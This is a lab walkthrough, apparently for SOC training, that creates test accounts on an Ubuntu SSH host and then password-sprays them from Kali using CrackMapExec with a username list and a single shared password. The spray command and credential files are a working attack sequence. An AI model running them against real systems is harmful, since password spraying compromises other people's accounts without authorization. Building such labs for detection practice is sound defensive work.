# Attack Simulation

## Lab Setup
This exercise uses an isolated lab with Kali Linux as the attack simulation machine and Ubuntu Linux as the SSH target. Replace `<TARGET_IP>` only in the lab command when executing the authorized simulation. Public documentation uses placeholders and does not expose real or private addresses.

## Create Controlled Test Users
Run on Ubuntu:

```bash
sudo adduser user1
sudo adduser user2
sudo adduser user3
sudo adduser user4
```

Each command creates a controlled test account. Set the password for `user3`:

```bash
sudo passwd user3
```

Use `Summer2024!` only as the lab-only test password for this exercise. It is not a real credential.

## Create Credential Lists
Create the username list on Kali:

```bash
nano ~/userlist.txt
```

Enter:

```text
user1
user2
user3
user4
testuser
admin
```

Create the single-password file:

```bash
echo "Summer2024!" > ~/spraypass.txt
```

The username file supplies multiple accounts, while the password file supplies one common lab password.

## Install CrackMapExec
If required, install the attack simulation tool on Kali:

```bash
sudo apt install crackmapexec -y
```

## Run the Simulation

```bash
crackmapexec ssh <TARGET_IP> -u ~/userlist.txt -p ~/spraypass.txt --continue-on-success
```

This invokes CrackMapExec against the target SSH service, reads usernames from `~/userlist.txt`, reads the single password from `~/spraypass.txt`, and continues testing after a successful authentication.

## Expected Lab Behavior
- Multiple usernames are tested using the same password.
- `user3` is the controlled account configured with the test password.
- CrackMapExec shows a successful authentication for `user3`.
- Other accounts may show authentication failures.

The actual output should be preserved as evidence only after the authorized lab execution. Do not invent or add results that were not observed.

## Safety Note
Run this workflow only against systems you own or are explicitly authorized to test. This exercise is an isolated cybersecurity lab for learning and SOC investigation practice. The password shown above is a lab-only test value and must not be reused as a real credential.
